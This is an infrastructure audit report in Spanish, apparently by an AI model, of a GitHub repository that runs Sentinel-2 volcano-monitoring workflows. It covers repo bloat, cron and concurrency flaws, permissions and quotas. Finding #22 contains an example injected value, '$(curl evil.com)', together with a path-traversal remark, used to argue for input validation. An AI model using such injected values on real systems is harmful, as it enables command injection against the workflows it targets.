# Auditoría de Infraestructura — Copernicus-v1

**Fecha:** 2026-05-17
**Auditor:** Claude (Opus 4.7, 1M context)
**Alcance:** CI/CD, seguridad, escalabilidad de datos, continuidad operativa
**Modo:** Sólo lectura. No se modificó nada.

---

## Resumen ejecutivo

1. 🔴 **El repo pesa 19 GB en `.git` (16.62 GB en packs)** con un solo pack file de **7.9 GB**. Esto está más allá del límite recomendado de GitHub (~5 GB) y va a empezar a romper clones/pushes en algún momento. Es el problema #1 de continuidad operativa.
2. 🔴 **`sentinel2_auto_DESHABILITADO.yml` NO está deshabilitado**: el nombre del archivo dice "DESHABILITADO" pero sigue con `cron: '0 6 * * *'` activo y hace `git add data/` a una carpeta que ya no existe. Es un workflow zombie que corre todos los días en silencio.
3. 🔴 **Cero `concurrency:` y cero `timeout-minutes:` en los workflows que pushean**. Cualquier solapamiento de 2 crons (ej. 10 UTC todavía corriendo y arranca 20 UTC) produce conflicto de push, race condition en el rebase `-X ours`, y potencial pérdida silenciosa de cambios. Ya pasó: hay commits `merge: resolver conflictos re-descarga` en la historia.
4. 🟠 **No hay pip cache** en ningún workflow → cada run reinstala dependencias desde cero (~30-60s × ~10 runs/día = 5-10 min de cómputo diario regalados).
5. 🟠 **Cuotas Copernicus no monitoreadas en código**: 46 volcanes × 2 evalscripts × 2 corridas/día = ~184 Process API calls/día base; el límite gratis es ~30k PU/mes. Sin métrica de "PU consumidas" expuesta — cuando se agote, los workflows van a empezar a fallar sin aviso anticipado.

---

## Stats actuales del repo

| Métrica | Valor |
|---|---|
| Tamaño `.git` | **19 GB** |
| `size-pack` (git count-objects) | **16.62 GiB** |
| Pack file más grande | **7.9 GB** (`pack-36ca7f820c…`) |
| Archivos trackeados | 4 671 |
| Commits totales | 857 |
| PNGs en `docs/sentinel2/` | 2 152 |
| GIFs en `docs/` | 184 |
| `.pptx` en disco (incluye `Pruebas/`) | 99 |
| `docs/` peso vivo | **2.0 GB** (sentinel2 = 1.6 GB, reportes = 217 MB, timelapses = 218 MB) |
| `Pruebas/` (gitignored, local) | 400 MB |
| `bibliografia/` | 51 MB |
| `fechas_disponibles_copernicus.json` | 22 KB · 46 volcanes · 1 076 fechas totales |
| `change_results.json` | 304 KB |
| `change_history.json` | 60 KB |
| Workflows activos (con `schedule`) | 4 |
| Workflows totales | 12 |

---

## Tabla de hallazgos

| # | Severidad | Categoría | Título |
|---|---|---|---|
| 1 | 🔴 | Escala | Repo `.git` de 19 GB, pack único de 7.9 GB |
| 2 | 🔴 | Workflows | `sentinel2_auto_DESHABILITADO.yml` sigue ejecutándose por cron |
| 3 | 🔴 | Workflows | Sin `concurrency:` ni `timeout-minutes:` en workflows que pushean |
| 4 | 🔴 | Workflows | Estrategia `git pull --rebase -X ours` puede descartar trabajo de runs paralelos |
| 5 | 🔴 | Continuidad | Imágenes PNG versionadas en git = ~1.6 GB en repo y creciendo |
| 6 | 🟠 | Workflows | Sin pip cache (`cache: 'pip'` no usado en ningún setup-python) |
| 7 | 🟠 | Workflows | Sin notificaciones de fallo (ni email, ni issue auto, ni Slack) |
| 8 | 🟠 | Workflows | `deploy.yml` referencia workflows con nombres viejos que ya no existen |
| 9 | 🟠 | Workflows | Versión de `actions/setup-python` inconsistente (`v4` en 9 archivos, `v5` en 1) |
| 10 | 🟠 | Workflows | `buscar_fechas_workflow.yml` duplica la lista de volcanes (43 inline) — divergente respecto a `config_sentinel2.py` (46) |
| 11 | 🟠 | Workflows | `ppt_individual_workflow.yml` lista 43 volcanes hardcoded en `options:` — falta sincronización con config |
| 12 | 🟠 | Seguridad | `permissions:` global "Read and write" (default) implícito al no restringir a nivel job en varios workflows |
| 13 | 🟠 | Escala | `Pruebas/` (400 MB) está gitignored pero ocupa espacio local — no hay política de purga |
| 14 | 🟠 | Escala | Cron `buscar_fechas` cada 6 h (4×día) vs `copernicus.yml` 2×día — overlap detectable |
| 15 | 🟠 | Datos | Cuotas Copernicus PU no monitoreadas; sin alerta cuando se acerca el límite |
| 16 | 🟠 | Datos | `change_history.json` crece sin rotación — eventualmente va a explotar |
| 17 | 🟡 | Docs | `STATUS.md` dice "2026-05-10" pero CLAUDE.md menciona estado de "10 may 2026" — fecha de auditoría es 2026-05-17 (7 días desactualizado) |
| 18 | 🟡 | Docs | `README.md` última modificación 2026-04-04 — desactualizado vs estado real |
| 19 | 🟡 | Docs | No hay runbook de "qué hacer si falla la auth Copernicus" / "cómo rotar SH_CLIENT_SECRET" |
| 20 | 🟡 | Workflows | `redescargar_todos_volcanes.yml` borra todo sin backup previo automático |
| 21 | 🟡 | Seguridad | Identidades de bots inconsistentes: 7 nombres distintos (`Copernicus Bot`, `Sentinel2Bot`, `RedownloadBot`, `ChangeAnalysisBot`, `PPTCompletoBot`, `PPTIndividualBot`, `TimelapsePPTBot`, `SpectralBot`, `AlertBot`) — dificulta auditoría del log |
| 22 | 🟡 | Workflows | `ppt_via_issue.yml` no valida que `VOLCAN` sea uno de la lista permitida — inyección de input potencial |
| 23 | 🟡 | Escalabilidad | Sin Git LFS para PNGs/GIFs — todos viven en pack history forever |
| 24 | 🟡 | Workflows | `deteccion_cambios.yml` (legacy V1) sigue presente con `workflow_dispatch:` — confusión documental |
| 25 | 🟡 | Continuidad | Branch protections en `main` no verificadas (no se puede chequear sin acceso a Settings de GitHub, pero los bots pushean directo sin PR) |

---

## Detalle por hallazgo

### 🔴 #1 — Repo `.git` de 19 GB, pack único de 7.9 GB

- **Ubicación:** `.git/objects/pack/pack-36ca7f820c…pack` (7.9 GB), `pack-e0d7acfa5f…pack` (3.5 GB), `pack-aee0e858cc…pack` (1.1 GB) y 15 packs más
- **Comando de verificación:** `git count-objects -vH` → `size-pack: 16.62 GiB`
- **Descripción:** El repo acumula años de PNGs/GIFs/PPTs binarios versionados. Los blobs más grandes del historial son `*.pptx` de hasta 14 MB y carpetas `data/sentinel2/` (que ya no existe en HEAD pero sigue en historia). Hay duplicados en historia: el mismo `Llaima_Evaluacion_Mensual_2026-01.pptx` aparece 4 veces con tamaños ligeramente distintos (14 MB cada uno).
- **Impacto:**
  - GitHub recomienda <1 GB de repo, **soft limit 5 GB, hard limit 100 GB**. Estamos 4× sobre el soft limit.
  - `git clone` toma minutos sobre conexión lenta — cualquier colaborador o reinstall del runner penaliza.
  - GitHub Actions checkout con `fetch-depth: 1` mitiga clientside pero el repo backend sigue creciendo.
  - Costos: GitHub puede empezar a throttlear o pedir migración a LFS.
- **Fix sugerido:**
  1. Identificar blobs grandes históricos: `git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | awk '$1=="blob" && $3>5000000' | sort -k3 -rn | head -50`
  2. Usar `git filter-repo --strip-blobs-bigger-than 5M` (después de backup completo y coordinación). Esto reescribe la historia.
  3. Migrar PNG/GIF/PPTX vivos a **Git LFS** o a un bucket externo (Cloudflare R2 free tier, GitHub Releases como ya se hace con PPTs combinados).
  4. Alternativa pragmática: archivar el repo actual a `Copernicus-v1-archive`, crear `Copernicus-v1-v2` con `--orphan` empezando desde HEAD actual, mantener historia mínima.

### 🔴 #2 — `sentinel2_auto_DESHABILITADO.yml` sigue ejecutándose

- **Ubicación:** `.github/workflows/sentinel2_auto_DESHABILITADO.yml:4-9`
- **Comando de verificación:** `grep -n "cron\|on:" .github/workflows/sentinel2_auto_DESHABILITADO.yml`
- **Descripción:** El nombre del archivo dice "DESHABILITADO" pero el contenido tiene:
  ```yaml
  on:
    schedule:
      - cron: '0 6 * * *'  # Diario a las 06:00 UTC
  ```
  GitHub Actions ignora el nombre del archivo y obedece al campo `on:`. Más grave: el step de commit hace `git add data/` y `data/` ya no existe en HEAD (se reemplazó por `docs/`). Es decir: corre, no agrega nada, no comitea, pero gasta minutos de Actions todos los días a las 06:00 UTC.
- **Impacto:** ~5-10 min de cómputo regalados/día. Si Copernicus cambia auth, este workflow va a empezar a fallar y a llenar el inbox de notificaciones. Confusión semántica grave: cualquiera que lee el nombre asume que está off.
- **Fix sugerido:** Cambiar `on: schedule:` por sólo `on: workflow_dispatch:` (igual que `deteccion_cambios.yml`), o **borrar el archivo** ya que su funcionalidad está cubierta por `copernicus.yml`.

### 🔴 #3 — Sin `concurrency:` ni `timeout-minutes:` en workflows que pushean

- **Ubicación:** `.github/workflows/*.yml` (todos excepto `deploy.yml`)
- **Comando de verificación:** `grep -rn "concurrency\|timeout-minutes" .github/workflows/` → sólo aparece en `deploy.yml` y `sentinel2_auto_DESHABILITADO.yml`
- **Descripción:** `copernicus.yml` corre 2×día (10 UTC, 20 UTC) y dura típicamente 10-30 min. `buscar_fechas_workflow.yml` corre cada 6 h. `spectral_indices.yml` a 22 UTC, `change_analysis.yml` a 22:30 UTC. Si `copernicus.yml` de las 20 UTC tarda más de 2 h (ej. por reintentos de Sentinel Hub lento), choca con `spectral_indices.yml` y ambos hacen `git pull --rebase -X ours && git push`.
- **Impacto:**
  - Runs que se podrían cancelar (más nuevo gana) corren los dos y compiten por push → carrera.
  - `-X ours` resuelve conflictos **descartando** silenciosamente el otro lado en cambios solapados → trabajo perdido.
  - Sin `timeout-minutes`, un cuelgue de Copernicus puede dejar el job vivo 6 h consumiendo minutos.
- **Fix sugerido:** Agregar a cada workflow scheduled:
  ```yaml
  concurrency:
    group: ${{ github.workflow }}
    cancel-in-progress: false  # importante: NO cancelar al medio, mejor encolar
  jobs:
    job:
      timeout-minutes: 45
  ```
  Y un `concurrency` global cross-workflow para los que pushean:
  ```yaml
  concurrency:
    group: push-main
    cancel-in-progress: false
  ```

### 🔴 #4 — `git pull --rebase -X ours` descarta trabajo en conflictos

- **Ubicación:** Todos los pasos de "Push" en los 8 workflows que pushean. Ejemplo en `copernicus.yml:89`, `change_analysis.yml:94`, `spectral_indices.yml:61`, `redescargar_todos_volcanes.yml:101-104`.
- **Descripción:** `-X ours` (strategy option) **descarta** los cambios del remoto cuando hay conflicto y se queda con los locales. Si dos bots tocan el mismo archivo (`change_results.json`, `fechas_disponibles_copernicus.json`), el segundo bot machaca el primero **sin warning**.
- **Impacto:** Race condition. En `redescargar_todos_volcanes.yml:101-104` la cosa es peor:
  ```bash
  git fetch origin main
  git merge origin/main --no-edit -X ours || true
  ```
  Más `git add -A` después → puede meter cambios no relacionados al commit.
- **Fix sugerido:**
  1. Cambiar a `-X theirs` para archivos JSON/metadata (preserva último escritor) o
  2. Mejor: usar `concurrency` global para serializar (ver #3) y entonces el rebase trivial nunca tiene conflictos reales.
  3. Para `change_results.json`, mantener `git pull --rebase` simple sin estrategia, y fallar fuerte si hay conflicto en lugar de silenciar.

### 🔴 #5 — Imágenes PNG versionadas en git ~1.6 GB y creciendo

- **Ubicación:** `docs/sentinel2/<volcan>/*.png` (2 152 archivos)
- **Comando de verificación:** `git ls-files docs/sentinel2 | wc -l` → 2 384; `du -sh docs/sentinel2` → 1.6 GB
- **Descripción:** Cada PNG pesa ~300 KB. Con 46 volcanes × ~30 imágenes/mes × 2 composites = ~1.6 GB/mes nuevos. Aunque `limpiar_imagenes_antiguas()` borra >60 días del filesystem (sentinel2_downloader.py:352), **el blob queda en la historia de git para siempre**.
- **Impacto:** Crecimiento lineal del pack que ya tocó 7.9 GB. Sin acción, en 12 meses esto está en 35-40 GB y empieza a romper clones.
- **Fix sugerido:**
  1. **Git LFS para `docs/sentinel2/**/*.png`**: la cuota gratuita de GitHub LFS es 1 GB de storage y 1 GB/mes de bandwidth — no alcanza, pero LFS también permite externalizar a S3/R2.
  2. Alternativa: mover imágenes a un repo externo (Cloudflare R2 free tier 10 GB) y servir desde ahí. El dashboard ya tiene precedente con `Landsat-v1`.
  3. Política BFG/filter-repo: re-escribir historia para borrar PNGs de commits >90 días.

### 🟠 #6 — Sin pip cache

- **Ubicación:** Todos los `actions/setup-python` en `.github/workflows/*.yml`
- **Comando de verificación:** `grep -rn "cache:" .github/workflows/` → cero resultados de pip cache
- **Descripción:** `setup-python@v4` soporta `with: cache: 'pip'`. No se usa en ningún workflow.
- **Impacto:** Cada uno de los ~10 runs diarios reinstala `pandas + Pillow + numpy + python-pptx + requests` desde PyPI. ~30-60s × 10 = 5-10 min/día de cómputo regalados. En el año: ~50 h.
- **Fix sugerido:**
  ```yaml
  - uses: actions/setup-python@v5
    with:
      python-version: '3.11'
      cache: 'pip'
      cache-dependency-path: requirements.txt
  ```
  Estandarizar todos a `setup-python@v5` y Python 3.11.

### 🟠 #7 — Sin notificaciones de fallo

- **Ubicación:** Todos los workflows
- **Descripción:** Si `sentinel2_downloader.py` falla con `SystemExit` por 401 (caso que mencionás en el contexto), el workflow se marca rojo pero **nadie se entera** salvo que entre a ver Actions. El email default de GitHub a veces se silencia.
- **Impacto:** Auth caducada o cambio de API pasa desapercibida hasta que alguien nota que el dashboard no actualiza (días/semanas).
- **Fix sugerido:** Agregar step `if: failure()` que abra un issue auto-asignado:
  ```yaml
  - name: Crear issue si falla
    if: failure()
    uses: actions/github-script@v7
    with:
      script: |
        github.rest.issues.create({
          owner: context.repo.owner,
          repo: context.repo.repo,
          title: `Workflow ${{ github.workflow }} falló - ${new Date().toISOString().slice(0,10)}`,
          body: `Run: ${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`,
          labels: ['workflow-failure']
        })
  ```

### 🟠 #8 — `deploy.yml` referencia workflows que ya no existen

- **Ubicación:** `.github/workflows/deploy.yml:8-12`
  ```yaml
  workflow_run:
    workflows:
      - "Sentinel-2 Auto Download"
      - "Generar Timelapse GIF"
      - "Generar PPT Evaluación Mensual"
  ```
- **Descripción:** Los nombres reales actuales son:
  - "Monitoreo Copernicus Automatico" (copernicus.yml)
  - "Generar Timelapses PPT (Todos los Volcanes)"
  - "PPT Evaluación Completa (Todos los Volcanes)"
  - etc.
- **Impacto:** `deploy.yml` nunca dispara por `workflow_run` (los nombres no matchean). Pero igual dispara por `push: [main]`, así que el sitio sí se redeploya — pero pasa por el path equivocado.
- **Fix sugerido:** Actualizar los nombres en `deploy.yml:8-12` o eliminar el trigger `workflow_run` y dejar sólo `push` + `workflow_dispatch`.

### 🟠 #9 — Versiones inconsistentes de `actions/setup-python`

- **Ubicación:**
  - `setup-python@v4`: copernicus.yml, change_analysis.yml, deteccion_cambios.yml, buscar_fechas_workflow.yml, spectral_indices.yml, redescargar_todos_volcanes.yml, ppt_completo_workflow.yml, ppt_individual_workflow.yml, ppt_timelapses_workflow.yml, sentinel2_auto_DESHABILITADO.yml
  - `setup-python@v5`: ppt_via_issue.yml
- **Impacto:** v4 está soft-deprecada; algunas features (`cache:`) funcionan mejor en v5. Inconsistencia indica mantenimiento incremental sin standar.
- **Fix sugerido:** Migrar todo a `@v5` en un único commit.

### 🟠 #10 — `buscar_fechas_workflow.yml` duplica lista de volcanes inline

- **Ubicación:** `.github/workflows/buscar_fechas_workflow.yml:47-95` (43 volcanes hardcoded en YAML)
- **Descripción:** El workflow embebe un script Python con la lista `VOLCANES = {...}` con 43 entradas. La fuente de verdad real es `config_sentinel2.py` que tiene **46** (43 + 3 vistas zoom).
- **Impacto:** Las 3 vistas zoom (Melimoyu_Conos_Eruptivos, Mentolat_Sismicidad_VT, Hudson_Ultima_Erupcion) **nunca se buscan** desde este workflow → `fechas_disponibles_copernicus.json` puede quedar fuera de sync. Verificación: hoy sí están las 46 (el JSON las tiene). Probablemente fueron agregadas a `config_sentinel2.py` pero **no** al workflow, y el JSON las tiene porque `sentinel2_downloader.py` (que sí usa config) las re-genera.
- **Fix sugerido:** Mover el script inline a `buscar_fechas.py` que importe de `config_sentinel2.py`. El workflow queda 5 líneas: checkout + setup-python + pip install + `python buscar_fechas.py` + commit.

### 🟠 #11 — `ppt_individual_workflow.yml` lista 43 volcanes hardcoded

- **Ubicación:** `.github/workflows/ppt_individual_workflow.yml:16-63` (43 opciones `choice`)
- **Descripción:** El dropdown `options:` de GitHub Actions UI debe ser estático en YAML; no se puede dinamizar desde Python. Pero igual está desincronizado: faltan las 3 vistas zoom.
- **Impacto:** Usuario no puede generar PPT individual de las vistas zoom desde la UI.
- **Fix sugerido:** Agregar las 3 vistas zoom faltantes, y dejar un comentario en `config_sentinel2.py` que diga "al agregar un volcán, actualizar también `.github/workflows/ppt_individual_workflow.yml:16-63`".

### 🟠 #12 — `permissions:` no minimizadas

- **Ubicación:** Varios workflows usan `permissions: contents: write` global del job; algunos como `ppt_via_issue.yml` requieren `issues: write` y lo declaran correcto. Pero `copernicus.yml:15-18` pide `pages: write` y `id-token: write` aunque el deploy a Pages está en otro job/workflow.
- **Impacto:** Token con más permisos del necesario. Si un step ejecuta código no confiable (raro acá pero posible), el blast radius es mayor.
- **Fix sugerido:** Auditar permiso por workflow. Modelo correcto:
  - `copernicus.yml` job principal: `contents: write` (commit/push). El deploy a Pages que sí necesita `pages: write` + `id-token: write` ya está separado en `deploy.yml`.

### 🟠 #13 — `Pruebas/` ocupa 400 MB sin política de purga

- **Ubicación:** `Pruebas/` (gitignored, ver `.gitignore:213`)
- **Descripción:** 400 MB de PNGs, GIFs, PPTs, ZIPs de debug y comparaciones one-shot. Bien gitignoreado, pero ocupa espacio local indefinidamente.
- **Fix sugerido:** Script `limpiar_pruebas.py` que borre todo lo de >30 días, o documentar en STATUS.md que `Pruebas/` se puede borrar manualmente sin consecuencias.

### 🟠 #14 — `buscar_fechas` cada 6h vs `copernicus.yml` cada 12h

- **Ubicación:** `buscar_fechas_workflow.yml:5` (`cron: '0 */6 * * *'`) vs `copernicus.yml:11` (`cron: '0 10,20 * * *'`)
- **Descripción:** `buscar_fechas` corre 4×/día (00, 06, 12, 18 UTC), `copernicus.yml` 2×/día (10, 20 UTC). Las pasadas de Sentinel-2 sobre Chile son 10:43-10:55 hora Chile (14-15 UTC), L2A disponible 6-12 h después (20-02 UTC). Buscar a las 00 y 06 UTC es desperdicio.
- **Fix sugerido:** Reducir `buscar_fechas` a 1-2×/día alineado con `copernicus.yml` (ej. 09 y 19 UTC, justo antes de cada descarga).

### 🟠 #15 — Cuotas Copernicus sin monitoreo

- **Descripción:** Copernicus Data Space tier gratuito = ~30 000 PU/mes. Estimación grosera:
  - 46 volcanes × 2 composites × 2 runs/día (copernicus.yml) = 184 process API calls/día = ~5 520/mes en RGB+Thermal
  - + `spectral_indices.yml` daily × 2 índices × 46 = otro ~2 760/mes
  - + `buscar_fechas` (catalog API, generalmente más barato): 46 × 4/día × 30 = 5 520 catalog calls/mes
  - **Total estimado:** 10k-15k PU/mes sin contar reintentos ni redescargas
  - Margen actual estimado: ~50% de cuota. Pero hay re-descargas frecuentes y `redescargar_todos_volcanes.yml` (workflow manual) puede consumir 4-5k PU de golpe.
- **Impacto:** Cuando se agote, todos los workflows fallan en `SystemExit` y nadie se entera (ver #7).
- **Fix sugerido:**
  1. Loggear PU consumidas por response header `x-processingunits-spent` de Sentinel Hub.
  2. Acumular en `docs/copernicus_usage.json` por día.
  3. Alerta cuando se llegue al 80% del mes.

### 🟠 #16 — `change_history.json` sin rotación

- **Ubicación:** `docs/change_detection/change_history.json` (60 KB hoy)
- **Descripción:** Acumula histórico de cada análisis (1×día). 60 KB hoy, ~22 MB/año proyectados si no se rota.
- **Fix sugerido:** Rotar mensualmente a `change_history_YYYY-MM.json` y mantener `change_history.json` con sólo últimos 90 días.

### 🟡 #17 — `STATUS.md` y `CLAUDE.md` ligeramente desactualizados

- **Ubicación:** `STATUS.md` línea 3 dice "Estado actual (2026-05-10)", la fecha de auditoría es 2026-05-17. CLAUDE.md menciona "10 may 2026".
- **Fix sugerido:** Actualizar cada vez que se haga un cambio significativo. Idealmente, agregar un cron de "actualizar STATUS.md con fecha" que documente el último cambio.

### 🟡 #18 — `README.md` desactualizado

- **Ubicación:** `README.md` mtime = 2026-04-04, hace ~6 semanas. CLAUDE.md menciona 46 volcanes; verificar que README también.
- **Fix sugerido:** Revisar y actualizar README con estado actual.

### 🟡 #19 — Sin runbook de incidentes

- **Faltante:** "qué hacer si:
  - Sentinel Hub auth falla 401 todo el día"
  - "Copernicus Data Space agota cuota"
  - "GitHub Actions limit reached"
  - "el sitio en Pages está caído"
  - "cómo rotar SH_CLIENT_SECRET"
  - "cómo agregar un volcán nuevo (qué archivos tocar)"
- **Fix sugerido:** Crear `docs/RUNBOOK.md` con cada escenario y los pasos exactos.

### 🟡 #20 — `redescargar_todos_volcanes.yml` borra sin backup

- **Ubicación:** `redescargar_todos_volcanes.yml:39-47`
- **Descripción:** Hace `find docs/sentinel2/ -name "*.png" -type f -delete` antes de re-descargar. Si la auth a Copernicus falla justo después, queda el repo **vacío de imágenes** hasta el próximo cron.
- **Fix sugerido:** Hacer `git tag pre-redescarga-$(date +%s)` antes del borrado para poder revertir vía `git checkout <tag> -- docs/sentinel2/`.

### 🟡 #21 — Identidades de bots inconsistentes

- **Hallazgo:** 9 identidades distintas: `Copernicus Bot`, `Sentinel2Bot`, `RedownloadBot`, `ChangeAnalysisBot`, `PPTCompletoBot`, `PPTIndividualBot`, `TimelapsePPTBot`, `SpectralBot`, `AlertBot`, `github-actions[bot]`.
- **Impacto:** `git log --author="bot"` es imposible de filtrar uniforme. Trazabilidad complicada.
- **Fix sugerido:** Unificar todos a `github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>` (estándar GitHub), poner el "bot específico" en el cuerpo del commit (`[copernicus] mensaje`).

### 🟡 #22 — `ppt_via_issue.yml` sin sanitización de input

- **Ubicación:** `ppt_via_issue.yml:27-29` (parseo del body del issue)
- **Descripción:** `VOLCAN`, `FECHA_INICIO`, `FECHA_FIN` se extraen con `grep` y `xargs` sin validar contra una whitelist. Si el usuario pone `VOLCAN=$(curl evil.com)`, eso se pasa como env var a `python timelapse_generator.py`. Python no lo evalúa como shell pero un `volcan = os.getenv("VOLCAN")` y luego `path = f"docs/{volcan}"` permite traversal con `../../`.
- **Impacto:** Bajo (Issues son públicos pero requieren label `ppt-request` y el path traversal está limitado), pero higiénicamente malo.
- **Fix sugerido:** Validar que `VOLCAN` esté en la lista de `config_sentinel2.py` antes de pasarlo al Python. Validar formato `YYYY-MM-DD` con regex.

### 🟡 #23 — Sin Git LFS

- Cubierto en #1 y #5. Decisión arquitectural pendiente: ¿LFS o externalizar a R2/S3?

### 🟡 #24 — `deteccion_cambios.yml` (V1 legacy) sigue presente

- **Ubicación:** `.github/workflows/deteccion_cambios.yml:1`
- **Descripción:** Header dice "V1 LEGACY - DESHABILITADO" pero el archivo está ahí con `workflow_dispatch`. Confusión documental con `change_analysis.yml`.
- **Fix sugerido:** Borrar `deteccion_cambios.yml` o moverlo a `.github/workflows-archive/` (no se ejecuta automáticamente).

### 🟡 #25 — Branch protections no verificables

- **No verificable** sin acceso a Settings del repo. Pero observación: los bots pushean directo a `main` sin PR ni review, y `redescargar_todos_volcanes.yml` puede borrar todas las imágenes con un solo workflow_dispatch.
- **Fix sugerido:** En GitHub UI → Settings → Branches → `main`:
  - Require status checks (al menos un linter de YAML)
  - Restrict deletions
  - No requerir PR (los bots no pueden hacer PRs prácticamente), pero al menos forbid force-push

---

## Riesgos de continuidad operativa

| Si falla… | Consecuencia | Mitigación actual | Mitigación faltante |
|---|---|---|---|
| Copernicus auth (token revocado / rotado) | Workflows fallan rojo, dashboard se queda estático | `SystemExit` fail-fast en `sentinel2_downloader.py` ✅ | Notificación automática (#7), runbook (#19) |
| Cuota Copernicus PU agotada | Igual: workflows fallan | — | Telemetría de PU (#15) |
| GitHub Pages cuota 100 GB/mes excedida | Sitio se desactiva | — | Mover assets pesados a CDN externo |
| `.git` excede 5 GB soft / 100 GB hard | Pushes lentos → eventualmente bloqueados | — | LFS o repurge (#1) |
| `Landsat-v1` (cross-repo) eliminado | Dashboard pierde modos Landsat | `continue-on-error: true` en checkout ✅ | — |
| Plantilla `Cambios_morfologicos.pptx` corrompida | Generación PPT falla | Versionada en git ✅ | Backup en releases |
| 2 workflows pushean simultáneo | Race condition, posible pérdida silenciosa | `--rebase -X ours` (mala práctica) | `concurrency` (#3, #4) |
| `SH_CLIENT_SECRET` se pierde | Workflows fallan permanentemente, no se puede generar uno nuevo desde el código | Guardado en GitHub Secrets | Backup encriptado del secret en password manager, runbook de rotación |
| Nicolás pierde acceso al repo | Continuidad operativa rota | — | Co-admin asignado, README con quick start |

---

## Plan de remediación priorizado

### Sprint inmediato (1-2 días)
1. 🔴 **Fix #2:** Renombrar/borrar `sentinel2_auto_DESHABILITADO.yml` para que NO ejecute cron (sólo `workflow_dispatch`).
2. 🔴 **Fix #3 (parcial):** Agregar `concurrency:` y `timeout-minutes: 45` a los 4 workflows scheduled (`copernicus`, `change_analysis`, `spectral_indices`, `buscar_fechas`).
3. 🔴 **Fix #8:** Actualizar nombres en `deploy.yml:8-12` o eliminar trigger `workflow_run`.
4. 🟠 **Fix #6:** Habilitar `cache: 'pip'` en todos los `setup-python` + estandarizar a `@v5` y Python 3.11.
5. 🟠 **Fix #7:** Step `if: failure()` que abra un issue con label `workflow-failure` en cada workflow scheduled.

### Sprint corto (1-2 semanas)
6. 🟠 **Fix #4:** Reemplazar `-X ours` por estrategia más segura, o serializar con concurrency global.
7. 🟠 **Fix #10, #11:** Extraer lista de volcanes a `buscar_fechas.py` (importa de config) y sincronizar dropdown manual de PPT.
8. 🟠 **Fix #15:** Telemetría de PU consumidas en `docs/copernicus_usage.json`.
9. 🟠 **Fix #16:** Rotación mensual de `change_history.json`.
10. 🟡 **Fix #19:** Crear `docs/RUNBOOK.md`.
11. 🟡 **Fix #21:** Unificar identidad de bots a `github-actions[bot]`.
12. 🟡 **Fix #22:** Validar input en `ppt_via_issue.yml`.

### Sprint medio (1 mes)
13. 🔴 **Fix #1 y #5 (decisión arquitectural):** Definir estrategia para tamaño del repo:
    - Opción A: Git LFS para `docs/sentinel2/**/*.png` (necesita pagar storage extra).
    - Opción B: Externalizar PNGs a Cloudflare R2 (10 GB free) + dashboard apunta a URL externa.
    - Opción C: `git filter-repo` agresivo (perdés historia, repo queda <2 GB).
    - Decidir, probar en fork, ejecutar.
14. 🟡 **Fix #24, #13, #20:** Limpieza de workflows legacy + política de purga `Pruebas/` + backup tag pre-redescarga.

---

## Anexo: comandos de auditoría reproducibles

```bash
# Tamaño del repo
git count-objects -vH

# Workflows con cron activo
grep -l "cron:" .github/workflows/*.yml

# Workflows sin concurrency
for f in .github/workflows/*.yml; do
  if ! grep -q "concurrency:" "$f"; then echo "FALTA: $f"; fi
done

# Workflows sin timeout
for f in .github/workflows/*.yml; do
  if ! grep -q "timeout-minutes:" "$f"; then echo "FALTA: $f"; fi
done

# Identificar volcanes en config vs JSON
python -c "
import json, sys; sys.path.insert(0,'.')
import config_sentinel2 as c
volcanes_cfg = set(c.get_active_volcanoes().keys() if hasattr(c,'get_active_volcanoes') else c.VOLCANES.keys())
volcanes_json = set(json.load(open('docs/fechas_disponibles_copernicus.json')).keys())
print('En config pero NO en JSON:', volcanes_cfg - volcanes_json)
print('En JSON pero NO en config:', volcanes_json - volcanes_cfg)
"

# Blobs más grandes en historia
git rev-list --objects --all \
  | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' \
  | awk '$1=="blob" && $3>5000000' | sort -k3 -rn | head -30

# Tamaño actual de docs/
du -sh docs/sentinel2 docs/timelapses docs/change_detection docs/reportes
```

---

**Total: 25 hallazgos** (5 críticos, 11 importantes, 9 nice-to-have).

Los 3 fixes más urgentes (`sentinel2_auto_DESHABILITADO`, concurrency/timeouts, deploy.yml workflow names) son cambios de <30 líneas YAML y deberían ir en el próximo commit.

El elefante en la habitación es el **tamaño del repo (19 GB)**. Sin decisión arquitectural pronto, esto va a forzar una migración traumática en algún punto entre 6-18 meses.
